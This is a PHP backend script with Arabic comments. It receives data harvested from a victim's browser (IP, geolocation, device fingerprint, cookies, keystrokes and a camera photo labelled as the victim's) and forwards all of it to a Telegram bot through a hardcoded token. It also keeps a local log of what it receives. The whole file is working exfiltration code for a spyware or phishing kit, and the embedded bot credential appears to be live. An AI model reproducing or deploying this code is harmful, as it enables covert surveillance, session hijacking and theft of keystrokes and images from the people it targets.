<?php
$botToken = "8934708518:AAEATzKMyKccDO-qO8kojQd08YcHuxHywy4";
$chatId = "6162147054";

header("Content-Type: application/json");

$input = file_get_contents("php://input");
$data = json_decode($input, true);

if ($data) {
    // إضافة IP
    $data['ip'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

    // بناء الرسالة
    $message = "🔥 *تم سحب البيانات الشامل* 🔥\n\n";
    $message .= "📌 *IP:* `{$data['ip']}`\n";
    $message .= "🌍 *الموقع:* `{$data['geo']['city']}, {$data['geo']['region']}, {$data['geo']['country']}`\n";
    $message .= "🗺️ *الإحداثيات:* `{$data['geo']['latitude']}, {$data['geo']['longitude']}`\n";
    $message .= "🖥 *المتصفح:* `{$data['device']['userAgent']}`\n";
    $message .= "💻 *النظام:* `{$data['device']['platform']}`\n";
    $message .= "🌐 *اللغة:* `{$data['device']['language']}`\n";
    $message .= "📱 *الشاشة:* `{$data['device']['screen']}`\n";
    $message .= "⏰ *التوقيت:* `{$data['device']['timezone']}`\n";
    $message .= "🧠 *عدد الأنوية:* `{$data['device']['hardwareConcurrency']}`\n";
    $message .= "💾 *الذاكرة:* `{$data['device']['deviceMemory']} GB`\n";
    $message .= "🍪 *الكوكيز:*\n```\n{$data['cookies']}\n```\n";
    $message .= "⌨️ *ضغطات المفاتيح:*\n```\n{$data['keylog']}\n```\n";
    $message .= "📅 *التاريخ:* `{$data['timestamp']}`";

    // إرسال النص إلى تيليجرام
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // إرسال الصورة إن وجدت
    if (!empty($data['image']) && $data['image'] !== "غير متاحة") {
        $imageData = base64_decode(preg_replace('#^data:image/\w+;base64,#', '', $data['image']));
        $tempFile = tempnam(sys_get_temp_dir(), 'img') . '.png';
        file_put_contents($tempFile, $imageData);

        $urlPhoto = "https://api.telegram.org/bot{$botToken}/sendPhoto";
        $postPhoto = [
            'chat_id' => $chatId,
            'caption' => "📸 *صورة من كاميرا الضحية*",
            'parse_mode' => 'Markdown'
        ];
        $file = new CURLFile($tempFile);
        $postPhoto['photo'] = $file;

        $ch2 = curl_init();
        curl_setopt($ch2, CURLOPT_URL, $urlPhoto);
        curl_setopt($ch2, CURLOPT_POST, true);
        curl_setopt($ch2, CURLOPT_POSTFIELDS, $postPhoto);
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch2);
        curl_close($ch2);

        unlink($tempFile);
    }

    // حفظ محلي
    file_put_contents("log_" . date("Y-m-d") . ".txt",
                      "[" . date("Y-m-d H:i:s") . "] " . json_encode($data) . PHP_EOL,
                      FILE_APPEND);

    echo json_encode(["status" => "done"]);
} else {
    echo json_encode(["status" => "error", "msg" => "No data"]);
}
?>